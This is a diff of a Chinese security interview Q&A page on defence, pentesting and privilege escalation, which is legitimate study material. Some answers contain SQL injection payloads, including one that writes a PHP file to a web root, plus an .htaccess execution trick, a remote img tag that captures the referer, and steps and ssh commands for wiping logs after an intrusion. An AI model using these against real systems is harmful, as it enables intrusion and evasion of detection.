+<h3 id="文件上传攻击特征">文件上传攻击特征？</h3>
+<p>上传文件的接口 对用户上传文件类型校验不严格</p>
+<h3 id="文件上传加固方法">文件上传加固方法？</h3>
+<p>后端限制文件上传白名单，头像不允许上传 svg
+上传后文件随机重命名，不要输出保存文件位置
+图片文件可以二次渲染，使用对象存储 oss 文件目录取消执行权限，PHP 设置
+basedir</p>
+<h3 id="你还用过其他态势感知的产品吗">你还用过其他态势感知的产品吗？</h3>
+<p>ips，ids，hids，堡垒机</p>
+<h3 id="钓鱼邮件处置">钓鱼邮件处置</h3>
+<p>屏蔽办公区域对钓鱼邮件内容涉及站点、URL 访问
+根据办公环境实际情况可以在上网行为管理、路由器、交换机上进行屏蔽
+对访问钓鱼网站的内网 IP 进行记录，以便后续排查溯源可能的后果
+根据钓鱼邮件发件人进行日志回溯</p>
+<h3 id="如何查看区分是扫描流量和手动流量">如何查看区分是扫描流量和手动流量</h3>
+<p>扫描数据量大，请求有规律，手动扫描间隔较少</p>
+<h3 id="入侵检测防御">️入侵检测&amp;防御</h3>
+<h3 id="waf产品如何来拦截攻击">WAF产品如何来拦截攻击？</h3>
+<p>云 Waf Web 防护软件 硬件 Web 防火墙</p>
+<h3 id="waf有哪些防护方式">WAF有哪些防护方式？</h3>
+<p>Web基础防护 可防范常规的 web 应用攻击，如 SQL 注入攻击、XSS
+跨站攻击等，可检测 webshell，检查 HTTP
+上传通道中的网页木马，打开开关即实时生效 CC 攻击防护 可根据 IP、Cookie
+或者 Referer 字段名设置灵活的限速策略，有效缓解 CC 攻击 精准访问防护
+对常见 HTTP 字段进行条件组合，
+支持定制化防护策略如CSRF防护，通过自定义规则的配置，更精准的识别恶意伪造请求、保护网站敏感信息、提高防护精准性
+IP 黑白名单 添加终拦截与始终放行的黑白名单 IP，增加防御准确性
+地理位置访问控制 添加地理位置访问控制规则，针对来源 IP
+进行自定义访问控制 网页防篡改
+对网站的静态网页进行缓存配置，当用户访问时返回给用户缓存的正常页面，并随机检测网页是否被篡改
+网站反爬虫
+动态分析网站业务模型，结合人机识别技术和数据风控手段，精准识别爬虫行为
+误报屏蔽 针对特定请求忽略某些攻击检测规则，用于处理误报事件 隐私屏蔽
+隐私信息屏蔽，避免用户的密码等信息出现在事件日志中 防敏感信息泄露
+防止在页面中泄露用户的敏感信息，例如：用户的身份证号码、手机号码、电子邮箱等</p>
+<h3 id="不安全的第三方组件的漏洞如何做前置规避">不安全的第三方组件的漏洞如何做前置规避？</h3>
+<h3 id="如果现在要你写一个检测命令注入的脚本">如果现在要你写一个检测命令注入的脚本？</h3>
+<h3 id="溯源基本步骤">️溯源基本步骤</h3>
+<p>&lt;1&gt; 攻击源捕获
+安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等
+日志与流量分析，异常的通讯流量、攻击源与攻击目标等
+服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等
+邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等 蜜罐系统，获取攻击者
+ID、电脑信息、浏览器指纹、行为、意图的相关信息</p>
+<p>&lt;2&gt; 溯源反制手段</p>
+<p>&lt;3&gt; 攻击者画像</p>
 <hr>
-<h3 id="黄金票据和白银票据的一些区别"><a href="#黄金票据和白银票据的一些区别" class="headerlink" title="黄金票据和白银票据的一些区别"></a>黄金票据和白银票据的一些区别</h3><p>1.访问权限不同<br>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限<br>Silver Ticket: 伪造TGS,只能访问指定的服务<br>2.加密方式不同<br>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密<br>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密<br>3.认证流程不同<br>Golden Ticket 的利用过程需要访问域控(KDC)<br>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</p>
-<h3 id="序列化与反序列化的区别"><a href="#序列化与反序列化的区别" class="headerlink" title="序列化与反序列化的区别"></a>序列化与反序列化的区别</h3><p>  序列化: 把对象转换为字符序列的过程  serialize()<br>  反序列化: 把字符序列恢复为对象的过程  unserialize()</p>
-<h3 id="常见的中间件漏洞？"><a href="#常见的中间件漏洞？" class="headerlink" title="常见的中间件漏洞？"></a>常见的中间件漏洞？</h3><p>  IIS       put漏洞 文件解析(6.0 /test.asp/test.jpg test.asp;.jpg | 7.5 test.jpg/.php)<br>  Apache    文件解析漏洞(php.xxx.yyy)  目录遍历<br>  Nginx     目录遍历 文件解析漏洞(1.png/.php-&gt; php 配置错误) CRLF注入(\r\n)<br>  Tomcat    war后门部署 远程代码执行<br>  Jboss     反序列化 war后门部署<br>  Weblogic  反序列化 ssrf war后门部署 任意文件上传</p>
-<h3 id="蚁剑-菜刀-C-刀-冰蝎的相同与不相同之处"><a href="#蚁剑-菜刀-C-刀-冰蝎的相同与不相同之处" class="headerlink" title="蚁剑/菜刀/C 刀/冰蝎的相同与不相同之处"></a>蚁剑/菜刀/C 刀/冰蝎的相同与不相同之处</h3><p>  &lt;1&gt;菜刀<br>    只使用url编码+base64编码<br>    shell 特征就是传输参数名为 z0，还存在int_set(“display_erros”,”0”)字符串特征<br>  &lt;2&gt;蚁剑<br>    默认的蚁剑shell连接时会请求两次，其请求体经过url编码<br>    第一次请求  关闭报错和 magic_qoutes 然后去获取主机信息<br>    第二次请求  列出主机目录<br>  &lt;3&gt;冰蝎2.0<br>    使用AES加密发送3次请求<br>    第一次请求  服务端产生密钥写入session， session和当前会话绑定，不同客户端的密钥也不同<br>    第二次请求  获取 key<br>    第三次请求  使用 key的AES加密进行通信<br>  &lt;4&gt;冰蝎3.0<br>    使用AES加密发起2次请求<br>    与2.0相比 少了动态密钥获取的请求，不再使用随机生成的key，改为取连接密码mad＋salt的前16为作为密钥<br>    第一次请求  判断是否可以建立连接<br>    第二次请求  发送phpinfo等代码执行，获取网站信息<br>  &lt;5&gt;哥斯拉<br>    支持 n 种加密<br>    采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求<br>    第一次请求  数据超级长，建立 session<br>    第二三次请求确认连接</p>
-<h3 id="正向-SHELL-和反向-SHELL-的区别"><a href="#正向-SHELL-和反向-SHELL-的区别" class="headerlink" title="正向 SHELL 和反向 SHELL 的区别"></a>正向 SHELL 和反向 SHELL 的区别</h3><p>  攻击机(kali) 受害者(win7)为例<br>  正向 kali 主动连win7<br>  反向 kali 监听端口 win7发起请求连接该端口</p>
-<h3 id="Windows-常用的提权方法"><a href="#Windows-常用的提权方法" class="headerlink" title="Windows 常用的提权方法"></a>Windows 常用的提权方法</h3><p>  potato<br>  udf<br>  systeminfo 提权辅助页<br>  ms15-051<br>  ms14-067<br>  令牌窃取</p>
-<h3 id="Linux-提权有哪些方法"><a href="#Linux-提权有哪些方法" class="headerlink" title="Linux 提权有哪些方法"></a>Linux 提权有哪些方法</h3><p>  suid<br>  sudo<br>  第三方服务<br>  内核</p>
-<p>  Linux DirtyPipe本地提权 CVE-2022-0847<br>  Linux Polkit权限提升漏洞 CVE-2021-4034<br>  Linux sudo权限提升漏洞 CVE-2021-3156<br>  Linux kernel权限提升漏洞 CVE-2021-3493</p>
-<h3 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h3><h3 id="为何一个-MYSQL-数据库的站，只有一个-80-端口开放？"><a href="#为何一个-MYSQL-数据库的站，只有一个-80-端口开放？" class="headerlink" title="为何一个 MYSQL 数据库的站，只有一个 80 端口开放？"></a>为何一个 MYSQL 数据库的站，只有一个 80 端口开放？</h3><p>  更改了端口<br>  站库分离<br>  3306不对外开放</p>
-<h3 id="一个成熟并且相对安全的-CMS，渗透时扫描目录的意义？"><a href="#一个成熟并且相对安全的-CMS，渗透时扫描目录的意义？" class="headerlink" title="一个成熟并且相对安全的 CMS，渗透时扫描目录的意义？"></a>一个成熟并且相对安全的 CMS，渗透时扫描目录的意义？</h3><h3 id="在某后台新闻编辑界面看到编辑器，应该先做什么？"><a href="#在某后台新闻编辑界面看到编辑器，应该先做什么？" class="headerlink" title="在某后台新闻编辑界面看到编辑器，应该先做什么？"></a>在某后台新闻编辑界面看到编辑器，应该先做什么？</h3><p>  查看编辑器版本名称 找之前爆出的对应漏洞</p>
-<h3 id="审查上传点的元素有什么意义？"><a href="#审查上传点的元素有什么意义？" class="headerlink" title="审查上传点的元素有什么意义？"></a>审查上传点的元素有什么意义？</h3><p>  如果站点文件上传类型限制是在前端实现的，那么增加上传类型就可以绕过</p>
-<h3 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h3><p>  XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、输出时采用html实体编码。<br>  CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>  XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
-<h3 id="3389-无法连接的几种情况"><a href="#3389-无法连接的几种情况" class="headerlink" title="3389 无法连接的几种情况"></a>3389 无法连接的几种情况</h3><p>  没开放3389端口<br>  端口被修改<br>  处于内网(需要端口转发)<br>  防护拦截</p>
-<h3 id="目标站无防护，上传图片可以正常访问，上传脚本格式访问则-403，什么原因？"><a href="#目标站无防护，上传图片可以正常访问，上传脚本格式访问则-403，什么原因？" class="headerlink" title="目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，什么原因？"></a>目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，什么原因？</h3><h3 id="目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"><a href="#目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？" class="headerlink" title="目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"></a>目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</h3><p>  先爆破用户名 </p>
-<h3 id="如何突破注入时字符被转义？"><a href="#如何突破注入时字符被转义？" class="headerlink" title="如何突破注入时字符被转义？"></a>如何突破注入时字符被转义？</h3><p>  宽字节注入<br>  hex编码</p>
-<h3 id="拿到一个-webshell-发现网站根目录下有-htaccess-文件，我们能做什么？"><a href="#拿到一个-webshell-发现网站根目录下有-htaccess-文件，我们能做什么？" class="headerlink" title="拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？"></a>拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？</h3><p>  <code>&lt;FilesMatch &quot;xxx.jpg&quot;&gt; SetHandler application/x-httpd-php</code><br>  .jpg文件会被解析成.php文件</p>
-<h3 id="安全狗会追踪变量，从而发现出是一句话木马吗？"><a href="#安全狗会追踪变量，从而发现出是一句话木马吗？" class="headerlink" title="安全狗会追踪变量，从而发现出是一句话木马吗？"></a>安全狗会追踪变量，从而发现出是一句话木马吗？</h3><h3 id="提权时选择可读写目录，为何尽量不用带空格的目录？"><a href="#提权时选择可读写目录，为何尽量不用带空格的目录？" class="headerlink" title="提权时选择可读写目录，为何尽量不用带空格的目录？"></a>提权时选择可读写目录，为何尽量不用带空格的目录？</h3><h3 id="如何利用这个防注入系统拿-shell？"><a href="#如何利用这个防注入系统拿-shell？" class="headerlink" title="如何利用这个防注入系统拿 shell？"></a>如何利用这个防注入系统拿 shell？</h3><h3 id="CSRF、SSRF-和重放攻击有什么区别？"><a href="#CSRF、SSRF-和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF 和重放攻击有什么区别？"></a>CSRF、SSRF 和重放攻击有什么区别？</h3><p>  CSRF是跨站请求伪造攻击，由客户端发起 SSRF是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
-<h3 id="nmap扫描的几种方式"><a href="#nmap扫描的几种方式" class="headerlink" title="nmap扫描的几种方式"></a>nmap扫描的几种方式</h3><p>  sT  TCP扫描<br>  sU  UDP扫描<br>  sP  ping扫描<br>  Pn  禁ping扫描<br>  sS  半开放扫描<br>  F   快速扫描</p>
-<h3 id="报错注入的函数有哪些？"><a href="#报错注入的函数有哪些？" class="headerlink" title="报错注入的函数有哪些？"></a>报错注入的函数有哪些？</h3><p>  10个<br>  <code>extractvalue(1, concat(0x7e,(select @@version),0x7e))</code><br>  <code>updatexml(1, concat(0x7e,(secect @@version),0x7e),1)</code><br> <code>exp()select from test where id=1 and exp(~(select * from(select user())a));</code><br>  floor报错向下取整<br>  …</p>
-<h3 id="延时注入如何来判断？"><a href="#延时注入如何来判断？" class="headerlink" title="延时注入如何来判断？"></a>延时注入如何来判断？</h3><p>  sleep() benchmark()</p>
-<h3 id="sql-注入写文件都有哪些函数？"><a href="#sql-注入写文件都有哪些函数？" class="headerlink" title="sql 注入写文件都有哪些函数？"></a>sql 注入写文件都有哪些函数？</h3><p>  into outfile<br>  into dumpfile</p>
-<h3 id="php中命令执行涉及到的函数"><a href="#php中命令执行涉及到的函数" class="headerlink" title="php中命令执行涉及到的函数"></a>php中命令执行涉及到的函数</h3><p>  eval()、assert()、popen()、system()、exec()、shell_exec()、passthru()、pcntl_exec()等函数</p>
-<h3 id="宽字节注入产生原理以及根本原因"><a href="#宽字节注入产生原理以及根本原因" class="headerlink" title="宽字节注入产生原理以及根本原因"></a>宽字节注入产生原理以及根本原因</h3><p>  在PHP中比如addslash和magic_quotes_gpc开启</p>
-<h3 id="如何防止-CSRF"><a href="#如何防止-CSRF" class="headerlink" title="如何防止 CSRF?"></a>如何防止 CSRF?</h3><p>  验证Referer<br>  添加token</p>
-<h3 id="代码执行，文件读取，命令执行的函数都有哪些？"><a href="#代码执行，文件读取，命令执行的函数都有哪些？" class="headerlink" title="代码执行，文件读取，命令执行的函数都有哪些？"></a>代码执行，文件读取，命令执行的函数都有哪些？</h3><p>  1，代码执行：<br>  eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function()<br>  2，文件读取：<br>  file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>  3，命令执行：<br>  system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
-<h3 id="img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？"><a href="#img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？"></a>img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</h3><p>  src指定一个远程的脚本文件，获取referer</p>
-<h3 id="img-标签除了-onerror-属性外，并且-src-属性的后缀名，必须以-jpg-结尾，怎么获取管理员路径。"><a href="#img-标签除了-onerror-属性外，并且-src-属性的后缀名，必须以-jpg-结尾，怎么获取管理员路径。" class="headerlink" title="img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以.jpg 结尾，怎么获取管理员路径。"></a>img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以.jpg 结尾，怎么获取管理员路径。</h3><p>  远程服务器修改apache配置文件<br>  配置.jpg文件以php方式来解析<code>AddType application/x-httpd-php .jpg</code><br>  <code>&lt;img src=http://xss.tv/1.jpg&gt;</code> 会以php方式来解析</p>
-<h3 id="为什么-aspx-木马权限比-asp-大？"><a href="#为什么-aspx-木马权限比-asp-大？" class="headerlink" title="为什么 aspx 木马权限比 asp 大？"></a>为什么 aspx 木马权限比 asp 大？</h3><p>  aspx使用的是.net技术。 IIS 中默认不支持，ASP只是脚本语言而已。<br>  入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p>
-<h3 id="如何绕过-waf？"><a href="#如何绕过-waf？" class="headerlink" title="如何绕过 waf？"></a>如何绕过 waf？</h3><p>  大小写<br>  内敛注释<br>  换行符<br>  编码<br>  参数污染</p>
-<h3 id="文件上传有哪些防护方式"><a href="#文件上传有哪些防护方式" class="headerlink" title="文件上传有哪些防护方式"></a>文件上传有哪些防护方式</h3><p>  文件上传的目录设置为不可执行<br>  白名单机制<br>  重命名<br>  使用安全设备防御</p>
-<h3 id="注入有防护怎么办"><a href="#注入有防护怎么办" class="headerlink" title="注入有防护怎么办"></a>注入有防护怎么办</h3><p>  绕waf</p>
-<h3 id="ddos-如何防护"><a href="#ddos-如何防护" class="headerlink" title="ddos 如何防护"></a>ddos 如何防护</h3><p>  SYN cookie(为每个ip分配一个”cookie”)<br>  统计ip访问频率 banip<br>  使用安全设备</p>
-<h3 id="为什么参数化查询可以防止-sql-注入"><a href="#为什么参数化查询可以防止-sql-注入" class="headerlink" title="为什么参数化查询可以防止 sql 注入"></a>为什么参数化查询可以防止 sql 注入</h3><p>  参数化查询可以对参数进行过滤，还能够重用执行计划，若执行计划被重用的话，SQL所要表达的语义是不会变化的<br>  之前学javaweb时候用过预处理的方法 把变量用?代替 然后再去写那个函数</p>
-<h3 id="sql-如何写-shell-单引号被过滤怎么办"><a href="#sql-如何写-shell-单引号被过滤怎么办" class="headerlink" title="sql 如何写 shell/单引号被过滤怎么办"></a>sql 如何写 shell/单引号被过滤怎么办</h3><p>  &lt;1&gt; 写shell(root权限，GPC关闭，知道文件路径，outfile函数)<br>  <code>http://127.0.0.1:81/sqli.php?id=1 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39; FIELDS TERMINATED BY &#39;&#39;</code><br>  <code>http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39;</code><br>  &lt;2&gt; 宽字节注入</p>
-<h3 id="对于-XSS-怎么修补建议"><a href="#对于-XSS-怎么修补建议" class="headerlink" title="对于 XSS 怎么修补建议"></a>对于 XSS 怎么修补建议</h3><p>  输入编码转义(可以用html实体编码)<br>  白名单过滤(过滤一些标签和js事件)<br>  httponly</p>
-<h3 id="添加-token和-referer-做横向对比，谁安全等级高？"><a href="#添加-token和-referer-做横向对比，谁安全等级高？" class="headerlink" title="添加 token和 referer 做横向对比，谁安全等级高？"></a>添加 token和 referer 做横向对比，谁安全等级高？</h3><p>  token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。<br>  并且FLASH一些版本中可以自定义referer。<br>  但是token的话，要保证其足够随机且不可泄露</p>
-<h3 id="常见的上传绕过方式"><a href="#常见的上传绕过方式" class="headerlink" title="常见的上传绕过方式"></a>常见的上传绕过方式</h3><p>  前端js验证 bp抓包改包<br>  大小写、双写<br>  00截断 %00 0x00<br>  mime类型绕过 改Content-Type</p>
-<h3 id="导致文件包含的函数"><a href="#导致文件包含的函数" class="headerlink" title="导致文件包含的函数"></a>导致文件包含的函数</h3><p>  <code>PHP: include(), include_once(), require(),require_once</code><br>  可参考 <a target="_blank" rel="noopener" href="https://err0rzz.github.io/2017/08/31/file_include/">https://err0rzz.github.io/2017/08/31/file_include/</a></p>
-<h3 id="入侵-Linux-服务器后需要清除哪些日志？"><a href="#入侵-Linux-服务器后需要清除哪些日志？" class="headerlink" title="入侵 Linux 服务器后需要清除哪些日志？"></a>入侵 Linux 服务器后需要清除哪些日志？</h3><p>  history   vim ~/.bash_history<br>  系统日志<br>  web日志   删除指定ip 时间点<br>  ssh登录记录 隐身登录系统，不会被w、who、last等指令检测到(<code>ssh -T root@192.168.0.1 /bin/bash -i</code>)<br>              不记录ssh公钥在本地.ssh目录中(<code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</code>)</p>
-<h3 id="如何加固一个域环境下的-Windows-桌面工作环境？请给出你的思路。"><a href="#如何加固一个域环境下的-Windows-桌面工作环境？请给出你的思路。" class="headerlink" title="如何加固一个域环境下的 Windows 桌面工作环境？请给出你的思路。"></a>如何加固一个域环境下的 Windows 桌面工作环境？请给出你的思路。</h3><p>  &lt;1&gt; 修补补丁，及时备份<br>  &lt;2&gt; 排查弱口令和账号<br>  &lt;3&gt; 开启服务与端口配置 关闭不必要的端口和服务<br>  &lt;4&gt; 日志配置与审核  增加日志大小以保证完整 对系统事件审核<br>  &lt;5&gt; 系统安全设置  设置屏保和远程连接挂起时间，禁止系统自动登录<br>  &lt;6&gt; 授权  只允许管理员组用户远程开机关机 只有授权用户才可远程登录或本地登录<br>  &lt;7&gt; 文件系统权限 删除everyone权限或取消everyone的写权限 限制部分系统命令的访问权限</p>
-<h3 id="宝塔禁止PHP函数如何绕过？"><a href="#宝塔禁止PHP函数如何绕过？" class="headerlink" title="宝塔禁止PHP函数如何绕过？"></a>宝塔禁止PHP函数如何绕过？</h3><p>  蚁剑disable_function插件</p>
-<h3 id="fastjson不出网如何利用？"><a href="#fastjson不出网如何利用？" class="headerlink" title="fastjson不出网如何利用？"></a>fastjson不出网如何利用？</h3><p>  dnslog回显</p>
-<h3 id="域内的一个普通用户（非域用户）如何进行利用？"><a href="#域内的一个普通用户（非域用户）如何进行利用？" class="headerlink" title="域内的一个普通用户（非域用户）如何进行利用？"></a>域内的一个普通用户（非域用户）如何进行利用？</h3><p>  域内提权？？CVE 2021-42287 / CVE 2021-42278</p>
-<h3 id="go语言免杀shellcode如何免杀？免杀原理是什么？"><a href="#go语言免杀shellcode如何免杀？免杀原理是什么？" class="headerlink" title="go语言免杀shellcode如何免杀？免杀原理是什么？"></a>go语言免杀shellcode如何免杀？免杀原理是什么？</h3><h3 id="windows-defender防御机制原理，如何绕过？"><a href="#windows-defender防御机制原理，如何绕过？" class="headerlink" title="windows defender防御机制原理，如何绕过？"></a>windows defender防御机制原理，如何绕过？</h3><h3 id="卡巴斯基进程保护如何绕过进行进程迁移？"><a href="#卡巴斯基进程保护如何绕过进行进程迁移？" class="headerlink" title="卡巴斯基进程保护如何绕过进行进程迁移？"></a>卡巴斯基进程保护如何绕过进行进程迁移？</h3><h3 id="工作组环境下如何进行渗透？"><a href="#工作组环境下如何进行渗透？" class="headerlink" title="工作组环境下如何进行渗透？"></a>工作组环境下如何进行渗透？</h3><h3 id="内存马的机制？"><a href="#内存马的机制？" class="headerlink" title="内存马的机制？"></a>内存马的机制？</h3><h3 id="说出印象比较深刻的一次外网打点进入内网？"><a href="#说出印象比较深刻的一次外网打点进入内网？" class="headerlink" title="说出印象比较深刻的一次外网打点进入内网？"></a>说出印象比较深刻的一次外网打点进入内网？</h3><h3 id="证书透明度的危害？"><a href="#证书透明度的危害？" class="headerlink" title="证书透明度的危害？"></a>证书透明度的危害？</h3>
+<h3 id="黄金票据和白银票据的一些区别">黄金票据和白银票据的一些区别</h3>
+<p>1.访问权限不同 Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限
+Silver Ticket: 伪造TGS,只能访问指定的服务 2.加密方式不同 Golden Ticket
+由Kerberos的Hash—&gt; krbtgt加密 Silver Ticket
+由服务器端密码的Hash值—&gt; master key 加密 3.认证流程不同 Golden Ticket
+的利用过程需要访问域控(KDC) Silver Ticket 可以直接跳过 KDC
+直接访问对应的服务器</p>
+<h3 id="序列化与反序列化的区别">序列化与反序列化的区别</h3>
+<p>序列化: 把对象转换为字符序列的过程 serialize() 反序列化:
+把字符序列恢复为对象的过程 unserialize()</p>
+<h3 id="常见的中间件漏洞">常见的中间件漏洞？</h3>
+<p>IIS put漏洞 文件解析(6.0 /test.asp/test.jpg test.asp;.jpg | 7.5
+test.jpg/.php) Apache 文件解析漏洞(php.xxx.yyy) 目录遍历 Nginx 目录遍历
+文件解析漏洞(1.png/.php-&gt; php 配置错误) CRLF注入() Tomcat war后门部署
+远程代码执行 Jboss 反序列化 war后门部署 Weblogic 反序列化 ssrf
+war后门部署 任意文件上传</p>
+<h3 id="蚁剑菜刀c-刀冰蝎的相同与不相同之处">蚁剑/菜刀/C
+刀/冰蝎的相同与不相同之处</h3>
+<p>&lt;1&gt;菜刀 只使用url编码+base64编码 shell 特征就是传输参数名为
+z0，还存在int_set("display_erros","0")字符串特征 &lt;2&gt;蚁剑
+默认的蚁剑shell连接时会请求两次，其请求体经过url编码 第一次请求
+关闭报错和 magic_qoutes 然后去获取主机信息 第二次请求 列出主机目录
+&lt;3&gt;冰蝎2.0 使用AES加密发送3次请求 第一次请求
+服务端产生密钥写入session，
+session和当前会话绑定，不同客户端的密钥也不同 第二次请求 获取 key
+第三次请求 使用 key的AES加密进行通信 &lt;4&gt;冰蝎3.0
+使用AES加密发起2次请求 与2.0相比
+少了动态密钥获取的请求，不再使用随机生成的key，改为取连接密码mad＋salt的前16为作为密钥
+第一次请求 判断是否可以建立连接 第二次请求
+发送phpinfo等代码执行，获取网站信息 &lt;5&gt;哥斯拉 支持 n 种加密
+采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求
+第一次请求 数据超级长，建立 session 第二三次请求确认连接</p>
+<h3 id="正向-shell-和反向-shell-的区别">正向 SHELL 和反向 SHELL
+的区别</h3>
+<p>攻击机(kali) 受害者(win7)为例 正向 kali 主动连win7 反向 kali 监听端口
+win7发起请求连接该端口</p>
+<h3 id="windows-常用的提权方法">Windows 常用的提权方法</h3>
+<p>potato udf systeminfo 提权辅助页 ms15-051 ms14-067 令牌窃取</p>
+<h3 id="linux-提权有哪些方法">Linux 提权有哪些方法</h3>
+<p>suid sudo 第三方服务 内核</p>
+<p>Linux DirtyPipe本地提权 CVE-2022-0847 Linux Polkit权限提升漏洞
+CVE-2021-4034 Linux sudo权限提升漏洞 CVE-2021-3156 Linux
+kernel权限提升漏洞 CVE-2021-3493</p>
+<h3 id="php-反序列化">PHP 反序列化</h3>
+<h3 id="为何一个-mysql-数据库的站只有一个-80-端口开放">为何一个 MYSQL
+数据库的站，只有一个 80 端口开放？</h3>
+<p>更改了端口 站库分离 3306不对外开放</p>
+<h3 id="一个成熟并且相对安全的-cms渗透时扫描目录的意义">一个成熟并且相对安全的
+CMS，渗透时扫描目录的意义？</h3>
+<h3 id="在某后台新闻编辑界面看到编辑器应该先做什么">在某后台新闻编辑界面看到编辑器，应该先做什么？</h3>
+<p>查看编辑器版本名称 找之前爆出的对应漏洞</p>
+<h3 id="审查上传点的元素有什么意义">审查上传点的元素有什么意义？</h3>
+<p>如果站点文件上传类型限制是在前端实现的，那么增加上传类型就可以绕过</p>
+<h3 id="csrf-和-xss-和-xxe-有什么区别以及修复方式">CSRF 和 XSS 和 XXE
+有什么区别，以及修复方式？</h3>
+<p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP
+Only来禁止JavaScript读取Cookie值、输入时校验、输出时采用html实体编码。
+CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer
+XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
+<h3 id="无法连接的几种情况">3389 无法连接的几种情况</h3>
+<p>没开放3389端口 端口被修改 处于内网(需要端口转发) 防护拦截</p>
+<h3 id="目标站无防护上传图片可以正常访问上传脚本格式访问则-403什么原因">目标站无防护，上传图片可以正常访问，上传脚本格式访问则
+403，什么原因？</h3>
+<h3 id="目标站禁止注册用户找回密码处随便输入用户名提示此用户不存在你觉得这里怎样利用">目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</h3>
+<p>先爆破用户名</p>
+<h3 id="如何突破注入时字符被转义">如何突破注入时字符被转义？</h3>
+<p>宽字节注入 hex编码</p>
+<h3 id="拿到一个-webshell-发现网站根目录下有.htaccess-文件我们能做什么">拿到一个
+webshell 发现网站根目录下有.htaccess 文件，我们能做什么？</h3>
+<p><code>&lt;FilesMatch "xxx.jpg"&gt; SetHandler application/x-httpd-php</code>
+.jpg文件会被解析成.php文件</p>
+<h3 id="安全狗会追踪变量从而发现出是一句话木马吗">安全狗会追踪变量，从而发现出是一句话木马吗？</h3>
+<h3 id="提权时选择可读写目录为何尽量不用带空格的目录">提权时选择可读写目录，为何尽量不用带空格的目录？</h3>
+<h3 id="如何利用这个防注入系统拿-shell">如何利用这个防注入系统拿
+shell？</h3>
+<h3 id="csrfssrf-和重放攻击有什么区别">CSRF、SSRF
+和重放攻击有什么区别？</h3>
+<p>CSRF是跨站请求伪造攻击，由客户端发起
+SSRF是服务器端请求伪造，由服务器发起
+重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
+<h3 id="nmap扫描的几种方式">nmap扫描的几种方式</h3>
+<p>sT TCP扫描 sU UDP扫描 sP ping扫描 Pn 禁ping扫描 sS 半开放扫描 F
+快速扫描</p>
+<h3 id="报错注入的函数有哪些">报错注入的函数有哪些？</h3>
+<p>10个
+<code>extractvalue(1, concat(0x7e,(select @@version),0x7e))</code>
+<code>updatexml(1, concat(0x7e,(secect @@version),0x7e),1)</code>
+<code>exp()select from test where id=1 and exp(~(select * from(select user())a));</code>
+floor报错向下取整 ...</p>
+<h3 id="延时注入如何来判断">延时注入如何来判断？</h3>
+<p>sleep() benchmark()</p>
+<h3 id="sql-注入写文件都有哪些函数">sql 注入写文件都有哪些函数？</h3>
+<p>into outfile into dumpfile</p>
